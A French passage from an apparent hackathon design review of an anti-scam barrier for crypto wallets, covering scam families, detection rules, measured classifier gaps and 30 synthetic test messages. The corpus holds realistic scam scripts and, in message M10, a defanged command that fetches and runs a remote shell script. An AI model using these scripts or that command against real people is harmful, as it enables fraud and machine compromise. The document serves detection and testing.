- **Chiffres.** TRM : pertes liées aux deepfakes en 2026 (période jusqu'au 17 août) supérieures de 263 % au total 2025 ([The Block](https://theblock.co/news/web3/2026-08-21-ai-adoption-in-crypto-crime-trm-412297)). IC3 2025 : première section IA, 22 364 plaintes, ~893 M USD (HSToday ci-dessus).
- **Barrière.** Paiement unique vers une adresse inconnue, labellisée par l'user avec le nom de la personne réelle (« Léa »).
- **Couvert ?** Non (S7 `ok`, S12 `ok`). Faille : l'étiquette `counterpartyLabel` est saisie par l'user mais jamais liée à l'adresse : si « Léa » est déjà dans le carnet avec une autre adresse, la barrière devrait le savoir.
- **Règle.**
```
if intent.counterpartyLabel in addressBook and addressBook[label].address != effects.outgoing[0].to:
   critical("tu connais Léa sous une autre adresse")   // mismatch contact/adresse
if label not in addressBook and tags.urgency/secrecy and cp.firstSeen and usd>3*p90: warn F2 + verification hors canal
```
- **Question.** « Cette adresse t'a été envoyée par message ? Appelle la personne sur le numéro que tu avais déjà, pas celui du message. » (vérification hors canal)
- **Objection + parade.** *« Le deepfake est parfait, la victime appelle quand même sur WhatsApp. »* Parade : instruire « numéro déjà enregistré », et pour les entreprises un mot de passe de famille/équipe ; la barrière n'atteint pas la vérité mais impose un second canal. Indétectable si l'user ment à la question.
- **FP.** Faible à moyen (changer d'adresse légitime : nouvel exchange).
- **Cas de test.** M21, M22 ; S7, S12.
- **Mapping.** ATT&CK : T1656, T1534 (Internal Spearphishing), T1586 (Compromise Accounts), T1657. D3FEND : D3-UBA. NIST CSF : DE.AE-02, DE.AE-03, RS.MI-01.

### M-08 Faux airdrop / mint via compte X ou Discord compromis

- **Script.** Un compte officiel (compromis) poste « claim » ou « mint » urgent avec lien vers un site drainer : signature `permit`, `setApprovalForAll`, ou `claim()` payable.
- **Chiffres.** ScamSniffer 2025 : 83,85 M USD, permit = vecteur principal, plus gros vol 6,5 M USD en un permit ; EIP-7702 émerge (2 cas majeurs en août) ([ScamSniffer](https://drops.scamsniffer.io/scam-sniffer-2025-crypto-phishing-losses-fall-83-to-84-million/)). Ces chiffres ne couvrent pas les comptes sociaux compromis (le rapport ne les isole pas).
- **Barrière.** Si le moteur décode : approbations (`approve`, `permit`, `setApprovalForAll`) ou delegation 7702 => `connect_or_accept_offer` + approval = `critical` (S13 = `critical`). Si la signature est opaque (EIP-712 non décodé), `Effects` vide => `ok` (S5, faux négatif).
- **Couvert ?** Oui pour approvals décodées ; non pour signatures opaques et pour `claim()` qui ne fait qu'un `transfer` payable (avec outgoing, `connect` => critical).
- **Règle (complément).** `if effects.kind=='signature' and effects.decoded==false: warn("signature illisible — ne signe pas si on t'a promis un cadeau")` ; `if tags.airdropClaim and domainAgeDays<30: critical`.
- **Question.** « Cette annonce vient-elle de plusieurs canaux officiels (site + docs) ? » Peu utile : préférer l'info de domaine.
- **Objection + parade.** *« Beaucoup d'airdrops légitimes se réclament par signature. »* Parade : seul le blocage sur `permit`/`setApprovalForAll` vers un spender jeune est automatique ; le reste est info.
- **FP.** Moyen sur le warn « signature illisible » : à n'activer qu'au-dessus d'un seuil de valeur du wallet.
- **Cas de test.** M14, M15 ; S5, S13.
- **Mapping.** ATT&CK : T1586.001 (compromission de comptes sociaux), T1566.002 (lien), T1656. D3FEND : D3-URA (URL Analysis), D3-DNSDL (DNS denylisting). NIST CSF : DE.AE-02, DE.CM-03, RS.MI-01.

### M-09 Recovery scam

- **Script.** Après une première perte, faux cabinets / « hackers éthiques » / faux agents FBI proposent la récupération contre frais d'avance, avec détails exacts de la perte et faux témoignages.
- **Chiffres.** IC3 2025 : plus de 10 500 plaintes de recovery scams, ~1,4 Md USD (HSToday). Alerte FBI du 13 août 2025 sur faux cabinets d'avocats ; juin 2024 : 9,9 M USD de pertes entre février 2023 et février 2024 (selon relais presse) ([Geebo](https://blog.geebo.com/2024/06/26/crypto-recovery-scams-torment-victims-says-fbi/)).
- **Barrière.** Petit paiement d'avance (0,15 ETH, 800 USDT).
- **Couvert ?** Non (S6 `ok`; M17 et M18 `legit`).
- **Règle.** Comme M-02 avec tag `recoveryFee` (`récupér(er|ation) (de )?(vos|tes) fonds|recover your (funds|crypto)|hacked back|frais de dossier en avance|gas fee first`). Aggrave : historique récent de perte (une tx suspecte récemment signalée par la barrière elle-même ou une adresse `scam_list` en sortie < 90 j) ; `critical`.
- **Question.** « Quelqu'un te propose de récupérer des fonds perdus contre paiement ? » Oui => texte FBI : « celui qui demande de l'argent pour récupérer le vôtre fait partie de l'arnaque ».
- **Objection + parade.** *« Il existe des services de traçage légitimes. »* Parade : légitimes = honoraires facturés en fiat par contrat vérifiable, jamais en crypto à une adresse reçue par DM.
- **FP.** Très faible.
- **Cas de test.** M17, M18 ; S6.
- **Mapping.** ATT&CK : T1656, T1566, T1657. D3FEND : D3-UBA. NIST CSF : DE.AE-02, RS.MI-01.

### M-10 Fausse autorité (fisc, police, « escrow gouvernemental »)

- **Script.** « Avis de redressement », « enquête blanchiment », paiement immédiat à une adresse « Trésor/escrow » ; menace de poursuites ; secret exigé.
- **Chiffres.** FTC : l'impersonation d'autorité est le premier motif des pertes via distributeurs BTC ([FTC](https://www.ftc.gov/news-events/data-visualizations/data-spotlight/2024/08/bitcoin-atms-payment-portal-scammers)). Aucune administration ne reçoit de paiement en crypto vers une adresse communiquée par message.
- **Barrière.** Transfert vers adresse neuve avec motif « payer l'amende ».
- **Couvert ?** Non (parseur : `pay_someone`; M19 et M20 `legit`).
- **Règle.** Tag `authority` (`police|gendarmerie|DGFiP|impôts|Trésor|IRS|FBI|Europol|financial crimes|escrow (gouvernemental|government)`) + tx sortante => `critical` : cas sans équivalent légitime (aucune autorité n'encaisse en USDC sur adresse reçue par chat).
- **Question.** « Une autorité te demande-t-elle de payer en crypto ? » Oui => texte : « Aucune administration n'encaisse en crypto sur une adresse reçue par message. Ne paie pas. »
- **Objection + parade.** *« Certains tribunaux acceptent la crypto (ex. certains États) »* Parade : cas ultra rares et jamais via un message non sollicité ; autoriser le contournement F3.
- **FP.** Très faible.
- **Cas de test.** M19, M20.
- **Mapping.** ATT&CK : T1656, T1566, T1657. D3FEND : D3-UBA. NIST CSF : DE.AE-02, RS.MI-01.

### M-11 Wrench attack / coercition physique

- **Script.** Enlèvement, séquestration ou intrusion à domicile ; l'agresseur force la victime à vider son wallet vers une adresse qu'il fournit, parfois en plusieurs étapes, souvent sous surveillance.
- **Chiffres.** CertiK : record de 72 wrench attacks vérifiées en 2025 (+75 %), pertes confirmées > 40,9 M USD (+44 %), Europe > 40 % des cas dont France 19 ([Decrypt](https://decrypt.co/356604/41m-in-losses-as-crypto-wrench-attacks-hit-record-high-in-2025)). Autorités françaises : 18 cas en 2024, 67 en 2025, 47 déjà en 2026 (relais [Decrypt](https://decrypt.co/365596/france-charges-88-including-minors-in-crypto-wrench-attack-crackdown)). Sous-déclaration probable (Cambridge, cité par [The Block](https://www.theblock.co/post/359010/france-hit-by-10th-crypto-wrench-attack-of-2025-as-kidnappers-target-23-year-old-near-paris)). Les décomptes diffèrent selon les bases (CertiK, Lopp, police) : toujours citer la source.
- **Barrière.** Un transfert « normal » dont la victime est la seule à connaître le contexte. Rien dans la tx ne dit « sous la contrainte ». Un sweep de 90-100 % vers une adresse neuve est possible.
- **Couvert ?** Indétectable avec certitude. Aujourd'hui : S8 `warn high_balance_share` (déjà un petit signal pour un sweep > 50 %). Le message de menace n'est pas dans le flux (l'agresseur est physiquement présent) ; M26 et M27 (messages de menace) existent pour le cas où un message de rançon est reçu, classés `legit` 0.50.
- **Mitigations de conception (honnêtes, non détectives).**
  1. **Time-lock sur nouvelle destination** : toute destination jamais vue + montant > seuil perso => délai obligatoire de 24 à 72 h (« confirmation différée »). Cela rompt l'intérêt de l'agression, car l'agresseur ne peut pas obtenir les fonds dans l'heure. Objection : *« je perds la liquidité »* => seuil configurable, exemption des destinations en liste blanche créées en avance.
  2. **Code de contrainte (duress PIN)** : un second code ouvre un wallet leurre avec un petit solde ; hors portée d'un module de pré-signature simple mais compatible avec la conception d'un wallet. À mentionner comme piste, pas comme livrable.
  3. **Limites quotidiennes** vers des destinations non vérifiées.
  4. Éviter d'exposer des données qui désignent la victime (c'est surtout du doxxing / fuites KYC, hors périmètre).
- **Règle (seulement ce qui est honnête).**
```
if cp.firstSeen and shareOfBalancePct>=80 and usd>=max(1000, 20*p50): F2 delai >=24h, notification a un contact de confiance
// pas de message 'vous etes peut-etre sous la contrainte' (dangereux : l'agresseur voit l'ecran)
```
- **Question.** Aucune à l'écran : l'agresseur peut la lire. C'est une exception à « question ciblée » : la friction doit être silencieuse (un délai qui paraît technique).
- **Risque.** Un avertissement explicite peut aggraver la violence : formuler le délai comme contrainte technique neutre (« confirmation de sécurité sous 24 h »).
- **FP / fatigue.** Moyen pour utilisateurs qui déplacent régulièrement de gros montants ; compensé par une liste blanche pré-déclarée.
- **Cas de test.** S8 ; M26, M27.
- **Mapping.** ATT&CK : n'a pas de technique pour la coercition physique ; le plus proche : T1657 (Financial Theft). D3FEND : D3-UBA, mitigation par délai (pas de technique exacte). NIST CSF 2.0 : PR.AA (accès à l'identité/aux autorisations) pour le délai, RS.MI-01. Dire clairement dans la fiche de défense que ce n'est pas du « detect ».

### M-12 Faux bots Telegram de trading / copy-trading / sniper

- **Script.** Bot ou canal : « profit auto 4 à 9 % par jour, zéro risque » ; déploie un contrat ou envoie des ETH au « contrat de la pool » ; parfois demande la clé privée pour « importer le wallet » (vol direct).
- **Chiffres.** Chainalysis place les programmes d'investissement à haut rendement parmi les plus gros volumes de scams ([Cointelegraph](https://cointelegraph.com/news/crypto-scams-2025-ai-impersonation-fraud-chainalysis)) ; je n'ai pas de chiffre fiable isolant « faux bots Telegram » : ne pas en citer.
- **Barrière.** Envoi d'ETH à un contrat ou déploiement d'un contrat tiers ; la demande de clé privée est hors tx.
- **Couvert ?** Partiel. M23 `investment_pitch` 0.63 ; M24 (FR, « reverse 3 % par jour ») `legit`. Envoi ETH simple vers un contrat jeune : `warn new_contract` seulement < 50 blocs (C4).
- **Règle.** `tags.guaranteedReturn (garanti|sans risque|risk[- ]free|\d+\s*%\s*(par jour|daily|per day))` => `investment_pitch` fort ; `if cp.isContract and not cp.verifiedSource and outgoing>0 and tags.guaranteedReturn: critical` ; `tags.privateKeyRequest (private key|clé privée)` => `critical` message (jamais légitime).
- **Question.** « On t'a promis un rendement fixe ou garanti ? » Oui => texte : « Aucun rendement journalier garanti n'existe sans risque. »
- **Objection + parade.** *« Les vaults DeFi affichent des APY. »* Parade : le tag est un **taux fixe quotidien/garanti + canal Telegram** ; un APY variable sur un protocole listé n'y entre pas.
- **FP.** Moyen sur `investment_pitch` pour le contenu pédagogique : n'en faire un `critical` que si une tx sortante vers contrat non vérifié suit.
- **Cas de test.** M23, M24 ; S1.
- **Mapping.** ATT&CK : T1566, T1656, T1204 (exécution utilisateur), T1657. D3FEND : D3-UBA, D3-URA. NIST CSF : DE.AE-02, DE.CM-03, RS.MI-01.

### M-13 Clones de swap en pub Google (Uniswap, MetaMask, Ledger)

- **Script.** Pub Google en tête de résultats, domaine proche (`app-uniswap[.]finance`), l'utilisateur « swap » et signe un `permit`/`permit2`/`approve` illimité ou le site demande des fonds ; contenu servi seulement aux cibles, redirigé vers une page propre pour les autres.
- **Chiffres.** Fausse pub Uniswap sur Google : > 400 000 USD volés ([ForkLog](https://forklog.com/en/fake-uniswap-ad-on-google-nets-scammers-400000/)) ; SEAL : 1,27 M USD sur des attaques similaires du 13 au 30 mars 2026 (relais presse, même article). ScamSniffer 2025 (ci-dessus) : permit = vecteur principal.
- **Barrière.** Signature `permit2` avec spender jeune/inconnu, ou `approve` illimité.
- **Couvert ?** Partiel. S10 : `warn unlimited_approval_swap` seulement (permit2 vers un spender de 15 000 blocs = ~2 jours passe en `warn`, pas `critical`). `permit_new_contract` ne vise que < 50 blocs. S11 (sortie ETH, entrée de jeton poubelle) : `ok`, car `no_incoming` ne regarde que le cas vide. Aucune notion d'origine/domaine dans `Effects`.
- **Règle.**
```
if kind in [permit, permit2, approve] and amount=='unlimited' and not isAllowlistedRouter(spender): critical
if origin.domainAgeDays<30 or origin in lookalike(topDapps) : critical
if intent.kind=='buy_or_swap' and incoming.every(tokenLiquidityUsd<10_000) and outgoing.usd>200: warn("le jeton recu ne vaut presque rien")
```
- **Question.** « Tu es arrivé ici en cliquant sur une pub ? » Oui => « Les pubs sont une source d'arnaques ; ouvre l'adresse enregistrée dans tes favoris ».
- **Objection + parade.** *« Beaucoup de swaps légitimes utilisent permit2. »* Parade : routeurs sur liste blanche (Uniswap Universal Router, 1inch, 0x) ; le critique ne vise que spender inconnu + illimité/jeune ; sinon limiter à `warn`.
- **FP.** Moyen sur dapps récentes légitimes : rediriger vers `warn` + F1.
- **Cas de test.** M25 ; S10, S11.
- **Mapping.** ATT&CK : T1583.008 (Malvertising), T1583.001 (domaines), T1566.002, T1036 (Masquerading), T1656. D3FEND : D3-URA, D3-DNSDL. NIST CSF : DE.CM-03, DE.AE-02, RS.MI-01.

### M-14 Seed saisie sur un faux site (hors tx)

- **Script.** Faux « Ledger Live » ou « MetaMask Support » demandant les 12/24 mots pour « synchroniser » ou « valider ».
- **Chiffres.** Voir ScamSniffer ; pas de décompte public isolé. Ne pas en inventer.
- **Barrière.** Aucune tx. La barrière tx est inopérante, le message collé est opérant.
- **Couvert ?** Message : oui. M07 `seed_phishing` 0.95 ; M08 `seed_phishing` 0.65 (seuil de confiance 0.6 franchi de peu). Mais M30 (vrai support qui dit de ne PAS donner la seed) donne `seed_phishing` 0.65 : faux positif (C9).
- **Règle.** Négation et contexte : ne tagger `seed_phishing` que si le message *demande* la saisie (`entrez|saisissez|enter|type` + `phrase|seed|12 words`) et n'est pas précédé de `never|jamais|ne (vous|te) demandera`. Détection côté extension : champ web contenant >= 12 mots BIP-39 consécutifs => alerte immédiate (indépendant de la tx).
- **Question.** Aucune : alerte automatique, car aucun cas légitime ne saisit la seed sur un site tiers.
- **Objection + parade.** *« Le praticien saisit sa seed pour restaurer dans un wallet officiel. »* Parade : l'alerte ne bloque pas, elle demande de vérifier que le domaine est celui du wallet officiel ; FP minime.
- **FP.** Faible avec gestion de la négation.
- **Cas de test.** M07, M08, M30.
- **Mapping.** ATT&CK : T1566, T1598.003, T1656, T1056.003 (Web Portal Capture si portail cloné). D3FEND : D3-URA, D3-DNSDL. NIST CSF : DE.CM-03, DE.AE-02, PR.AT-01.

---

## 4. Corpus de 30 messages synthétiques (FR/EN)

Tous inventés ; aucune donnée personnelle réelle ; les domaines utilisent le format défanged `[.]`. `Mesuré` = sortie réelle du provider keyword actuel (`label confiance`). `Cible` = ce que le classifieur doit sortir après correction (taxonomie proposée §6). `legit` attendu pour M28 à M30.

| ID | Lg | Famille | Message | Mesuré aujourd'hui | Cible |
|---|---|---|---|---|---|
| M01 | FR | M-01 | Salut, désolée du dérangement, je t'ai trouvé via un groupe d'entraide. Mon oncle travaille dans un fonds à Singapour, on a fait +38% en 3 semaines sur la plateforme NexaTrade. Je t'envoie le lien, commence avec 200 USDT pour tester, tu peux retirer quand tu veux. | legit 0.50 | investment_pitch (tags: relationship, guaranteedReturn) |
| M02 | EN | M-01 | Good morning dear :) Hope your day is going well. My trading mentor says the market maker window closes today, the platform shows my account up 112% this month. Deposit 1500 USDT to the address in the app and I'll guide you step by step. | legit 0.50 | investment_pitch |
| M03 | EN | M-02 | Your withdrawal of 18,420 USDT is approved. To unlock it you must pay the 20% income tax (3,684 USDT) to the compliance wallet 0x... within 48h or the account will be frozen. | legit 0.50 | advance_fee (critical) |
| M04 | FR | M-02 | Votre retrait est bloqué : un dépôt de vérification de 1 200 USDT est nécessaire pour prouver la solvabilité du compte. Il vous sera restitué avec vos gains sous 24 h. | legit 0.50 | advance_fee (critical) |
| M05 | FR | M-03 | Bonjour, ici le service anti-fraude Coinbase. Nous avons détecté un accès non autorisé à votre compte depuis la Russie. Pour protéger vos fonds, transférez-les immédiatement vers un portefeuille sécurisé que je vais vous indiquer. Ne raccrochez pas. | legit 0.50 | fake_support + safeAddress + secrecy |
| M06 | EN | M-03 | This is Coinbase Fraud Prevention. Your account ending 4471 has been compromised and attackers are attempting to withdraw. We have created a new secure Ledger wallet for you. Move all assets to it now and do not tell anyone, including bank staff, as insiders may be involved. | legit 0.50 | fake_support + safeAddress + secrecy |
| M07 | EN | M-14/M-03 | MetaMask Support: we noticed unusual activity on your wallet. Validate your wallet by entering your 12-word Secret Recovery Phrase at metamask-verify[.]support to avoid suspension in 24 hours. | seed_phishing 0.95 | seed_phishing |
| M08 | FR | M-14 | Ledger Live : une mise à jour de sécurité est obligatoire. Saisissez votre phrase de récupération de 24 mots sur le portail pour resynchroniser votre appareil. | seed_phishing 0.65 | seed_phishing (conf >= 0.8) |
| M09 | EN | M-05 | Hi! I'm a recruiter at Kraken Web3 Labs. We loved your GitHub. Senior Solidity role, $14k/month remote. Next step: a 2-hour take-home, clone this repo and run npm install && npm start, then record a short video. | legit 0.50 | fake_job (remoteCommand) |
| M10 | EN | M-05 | Thanks for joining the interview. Your camera is not detected. To fix, open Terminal and paste: curl -s https://cdn-meet[.]live/fix.sh \| bash then rejoin the call. | legit 0.50 | fake_job critical (ClickFix) |
| M11 | FR | M-05 | Bonjour, nous recrutons un développeur smart contracts pour un projet DeFi. Salaire 9 000 €/mois, télétravail. Pouvez-vous lancer ce test technique depuis ce dépôt GitHub et nous envoyer une capture ? | legit 0.50 | fake_job |
| M12 | EN | M-06 | Baby I miss you so much. I'm stuck at the airport in Dubai, my cards are blocked. Can you send 400 USDT to my wallet 0x... just until tomorrow? I'll pay you back, I promise, I love you. | legit 0.50 | romance_or_trust_request |
| M13 | FR | M-06/M-01 | Mon chéri, mon père a gagné énormément avec le trading de crypto, il m'a montré l'appli. Si tu m'aimes, fais-moi confiance : mets 3 000 USDT, on construit notre avenir ensemble. | legit 0.50 | romance_or_trust_request + investment_pitch |
| M14 | EN | M-08 | ALERT @ProjectXOfficial: The $PRJX airdrop is LIVE for early holders. Claim before snapshot ends in 2 hours -> projectx-claim[.]xyz connect wallet and sign to verify eligibility. | fake_refund_or_gift 0.64 | fake_refund_or_gift (conf >= 0.8 avec urgence + claim) |
| M15 | FR | M-08 | @everyone Mint exclusif ouvert uniquement 30 min pour les membres OG ! Contrat vérifié, mint gratuit : lien dans #annonces. Connectez votre wallet pour valider. | fake_refund_or_gift 0.64 | fake_refund_or_gift |
| M16 | EN | M-04 | Security alert: our monitoring shows your wallet is being drained by a malicious contract. A white-hat can rescue the remaining funds if you transfer them to this safe vault 0x... before the attacker's next block. | legit 0.50 | fake_support + safeAddress |
| M17 | FR | M-09 | Cabinet RecuperaCrypto, avocats spécialisés. Nous avons identifié vos 12 400 USDT volés. Frais de dossier 800 USDT en avance, 100% des fonds récupérés sous 7 jours, mandat FBI/Europol. | legit 0.50 | recovery_scam |
| M18 | EN | M-09 | I saw you were scammed. I hacked back the scammer wallet and can restore 2.1 ETH. Only a gas fee of 0.15 ETH is needed first, send it and I'll release the funds. | legit 0.50 | recovery_scam |
| M19 | FR | M-10 | Direction Générale des Finances Publiques, avis de redressement : vos plus-values cryptos 2024 n'ont pas été déclarées. Régularisez sous 72 h en payant 2 300 € en USDC à l'adresse du Trésor ci-dessous, sous peine de poursuites. | legit 0.50 | authority_impersonation (critical) |
| M20 | EN | M-10 | This is Agent Morrow, financial crimes unit. Your wallet is linked to a money-laundering investigation. To prove your funds are legitimate, move them to the government escrow wallet. Do not discuss this call. | legit 0.50 | authority_impersonation + secrecy |
| M21 | EN | M-07 | [voice note transcript, CFO] I'm in a meeting, can't call. Wire 25,000 USDC to this vendor wallet for the acquisition deposit, it's confidential, I'll explain after. | legit 0.50 | known_contact_urgent_payment |
| M22 | FR | M-07 | Hey c'est Léa, mon compte Insta a été hacké, mais là c'est bien moi. J'ai un souci de paiement urgent, tu peux m'avancer 250 USDC ? Je te rembourse lundi, je t'envoie l'adresse. | legit 0.50 | known_contact_urgent_payment |
| M23 | EN | M-12 | SniperBot PRO: auto-profit 4-9% daily, 0 risk. Just deploy the contract below with 0.5 ETH and the bot runs arbitrage for you. Withdraw anytime! Paste your private key to import your wallet. | investment_pitch 0.63 | investment_pitch + privateKeyRequest (critical) |
| M24 | FR | M-12 | Bot de copy-trading rentable : envoyez 1 ETH au contrat de la pool, le robot fait des arbitrages et reverse 3 % par jour. Garanti, des centaines de membres satisfaits sur le canal. | legit 0.50 | investment_pitch |
| M25 | EN | M-13 | Uniswap Interface - Swap tokens instantly. Sponsored. app-uniswap[.]finance Connect wallet to start swapping. Sign the permit to continue. | legit 0.50 | phishing_site (domaine, pas texte) |
| M26 | EN | M-11 | If you don't send everything from your hardware wallet to this address in the next hour, we will hurt your family. We know where your kids go to school. | legit 0.50 | coercion (alerte + conseil d'appeler les secours) |
| M27 | FR | M-11 | Ouvre ton app, vire tout sur cette adresse, vite. Fais pas le malin, on est devant chez toi. | legit 0.50 | coercion |
| M28 | EN | légitime | Hey, here's my Ledger deposit address for the 0.5 ETH I owe you for the concert tickets. Thanks again, let me know once sent! | legit 0.50 | legit (>= 0.7) |
| M29 | FR | légitime | Salut, voici l'adresse de mon exchange pour te rembourser les 120 € du resto. Tu peux envoyer 120 USDC quand tu veux, pas de souci. | legit 0.50 | legit |
| M30 | EN | légitime (support réel) | Hi, thanks for contacting MetaMask Support. We will never ask for your Secret Recovery Phrase. Please see our guide at support.metamask.io on how to speed up a pending transaction. | seed_phishing 0.65 (FP) | legit |

Bilan mesuré : sur les 27 messages d'arnaque (M01 à M27), **4 sont étiquetés correctement par le classifieur keyword** (M07, M08, M14, M15, avec confiance 0.64 à 0.95), **22 passent en `legit` 0.50**, **1 (M23) est bon à 0.63**. Sur les 3 messages légitimes, 1 faux positif (M30). Autres faux positifs mesurés hors corpus : « Dis à Paul que son token est arrivé » = `fake_support` 0.90 ; « Please say hi to Marie, the book is ready » = `fake_support` 0.90 ; « Happy birthday! Here's a gift for you » = `fake_refund_or_gift` 0.64.

Test à ajouter : passer chaque message avec et sans `pastedMessage` dans un scénario `compare()` complet (voir §5) pour mesurer l'effet du pont message-tx.

---

## 5. Scénarios d'effets (comparateur) : résultats mesurés

Setup : `from`=0x33.., contrepartie 0x22.. `firstSeenByUser=true`, âge 900 000 blocs, 1 500 USDC sortant, part 3 %, sauf mention.

| ID | Scénario | Intent | Aujourd'hui | Cible |
|---|---|---|---|---|
| S1 | Dépôt pig butchering | pay_someone 1500 | **ok** | warn F1 (ou critical si message tagué) |
| S2 | Même tx | send_to_my_account | critical `first_seen_recipient` | critical (message correct : « adresse inconnue », pas « ton compte ») |
| S2b | 2e dépôt, désormais « vu » | send_to_my_account | **ok** | warn F2 (escalade) |
| S3 | Sweep 95 % vers « wallet sûr » | pay_someone | warn `high_balance_share` | critical si non prouvé |
| S3b | Sweep 40 % | pay_someone | **ok** | warn F2 |
| S4 | « Le support m'a demandé » | asked_by_someone | critical | critical |
| S5 | Faux airdrop, signature opaque, effets vides | connect_or_accept_offer | **ok** | warn (signature illisible) |
| S6 | Frais de récupération 0,15 ETH | pay_someone | **ok** | critical si tag `recoveryFee` |
| S7 | « Léa » demande 250 USDC, adresse inconnue | pay_someone + label | **ok** | critical si Léa connue avec une autre adresse |
| S8 | Wrench : 100 % vers adresse neuve | pay_someone | warn | F2 silencieux (time-lock) |
| S9 | Contrat de 20 min sur L2 (100 blocs) | pay_someone | **ok** (seuil 50 blocs) | warn (âge en temps) |
| S9b | Contrat d'1 h sur L1 (300 blocs) | pay_someone | **ok** | warn |
| S10 | Clone Uniswap, permit2 illimité, spender ~2 j | buy_or_swap | warn | critical |
| S11 | Swap : sort 2 ETH, entre 1 M jetons poubelle | buy_or_swap | **ok** | warn (liquidité du jeton reçu) |
| S12 | Adresse + label « Support Coinbase » saisis par l'user | pay_someone | **ok** | critical (label d'une marque + adresse non vérifiée) |
| S13 | Delegation EIP-7702 sous « connexion » | connect_or_accept_offer | critical | critical |

Résumé : 10 scénarios sur 16 sortent `ok` et 3 `warn` alors que la tx est une arnaque ; 3 seulement sont `critical`. Les critiques actuels viennent presque tous de règles d'approbation, de `asked_by_someone` ou de délégation, pas de manipulation.

---

## 6. Changements recommandés (ordre d'impact, tous compatibles hackathon)

1. **Pont message -> verdict (C1).** `compare(intent, effects, ctx)` reçoit `msgTags` (sortie multi-label du classifieur) et applique la fusion de §2.2. Sans cela, toute la famille reste hors portée.
2. **Taxonomie de tags (pas de labels exclusifs).** Ajouter `unlockFee`, `safeAddress`, `authority`, `secrecy`, `urgency`, `guaranteedReturn`, `relationshipMoneyRequest`, `recoveryFee`, `remoteCommand`, `coercion`, `privateKeyRequest` en plus des 6 labels. Le multi-label est plus robuste : un message d'arnaque cumule 3 à 4 tags.
3. **Règle `first_seen_recipient` pour tous les intents sortants** (C3) avec seuil relatif au profil (§2.3) et exemptions (carnet > 7 j, labels exchange/dapp).
4. **Propager la confiance du parseur (C2)** et traiter « l'intent par défaut `connect_or_accept_offer` à 0.3 » comme un cas à clarifier (question) plutôt que silencieux.
5. **Âge en temps réel, pas en blocs (C4)** : `ageHours` avec seuils 24 h (warn) et 7 j (info).
6. **Ne pas se désarmer (C12)** : une adresse validée par clic reste `unproven` pour la règle sweep ; seule une preuve de possession ou 3 tx sans incident après 30 j la fait passer en `known`.
7. **Corriger le classifieur** : `\b` internes dans le motif d'injection (C9), négation pour `seed_phishing`, `recrut\w*` (C10), accepter les images (C11).

---

## 7. Ce qui reste indétectable (à assumer devant le jury)

- Une victime convaincue qui ment à la question, vers une contrepartie propre (adresse sans historique négatif, ni jeune) : aucun signal de tx. On ralentit, on ne bloque pas.
- Wrench attack : détectable seulement par friction d'architecture (time-lock), pas par analyse.
- Contagious Interview une fois le malware installé : la barrière n'est plus dans la boucle.
- Saisie de la seed sur un site tiers (hors tx).
- Pig butchering sur Tron/Bitcoin/CEX fiat : hors périmètre EVM.
- Deepfake parfait + changement d'adresse légitime-looking : seul un second canal « hors bande » aide.
- Identité d'un « contact connu » dont l'adresse n'est pas dans le carnet : pas de vérité terrain.

---

## 8. Top 5 trous (à combler avant la démo, par ordre de rentabilité)

1. **Aucun pont entre `classifyMessage` / `pastedMessage` / `askedBy` et `compare()`.** Un message de faux support collé ne change pas le verdict. Corriger : fusion message x tx (§2.2). Impact : débloque M-02, M-03, M-04, M-06, M-07, M-09, M-10, M-12.
2. **`pay_someone` sans règle de contrepartie nouvelle** (et `firstSeenByUser` jamais lu hors `send_to_my_account`). Le cas pig butchering, recovery, ami piraté, wallet sûr formulé « send » : tous `ok`. Corriger : première vue + montant relatif au profil.
3. **Classifieur de messages quasi aveugle sur cette famille** : 22 arnaques sur 27 en `legit` 0.50, et des faux positifs gênants (injection par sous-chaîne « ok », négation de seed). Corriger : multi-tags (`unlockFee`, `safeAddress`, `authority`, `remoteCommand`, `secrecy`, `recoveryFee`), `\b` internes, français (`recrutons`, `taxe`, `retrait bloqué`).
4. **Désarmement après validation et seuils trop laxistes** : l'adresse « vue » une fois est ensuite de confiance (S2b) ; 50 blocs et 50 % de solde sont des seuils sans lien avec la réalité des chaînes ni des montants (2 764 USD en moyenne). Corriger : preuve de possession, âge en heures, p90 perso, séquence/escalade.
5. **Pas de contexte d'origine (domaine/pub/clone) ni de signal de liquidité du jeton reçu** : clone de swap Google (S10 en `warn`), faux airdrop à signature opaque (S5 en `ok`), swap contre jeton poubelle (S11 en `ok`). Corriger : `origin.domainAgeDays`, liste de dapps/routeurs, warn sur signature illisible, liquidité du jeton entrant.

Sous le Top 5, mention spéciale : **wrench / coercition** doit être traité par une décision produit (time-lock sur nouvelle destination, silencieux) et non par un détecteur.
